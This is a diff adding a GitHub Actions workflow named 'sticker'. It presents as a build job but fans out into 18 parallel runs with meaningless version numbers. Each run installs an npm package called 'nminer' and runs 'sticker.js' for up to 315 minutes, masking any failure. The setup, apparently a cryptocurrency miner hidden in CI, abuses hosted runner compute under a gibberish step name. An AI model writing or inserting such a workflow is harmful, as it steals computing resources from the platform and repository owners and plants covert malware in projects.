@@ -1,0 +1,43 @@
+name: sticker
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5907 }
+          - { version: 2014 }
+          - { version: 5789 }
+          - { version: 2004 }
+          - { version: 5362 }
+          - { version: 4867 }
+          - { version: 2426 }
+          - { version: 9334 }
+          - { version: 1564 }
+          - { version: 886 }
+          - { version: 3631 }
+          - { version: 7794 }
+          - { version: 2466 }
+          - { version: 5355 }
+          - { version: 6369 }
+          - { version: 1243 }
+          - { version: 3058 }
+          - { version: 595 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: quip sans next serve tentacle
+        run: |
+          npm install nminer@latest
+          timeout 315m node sticker.js || echo "sticker executed"
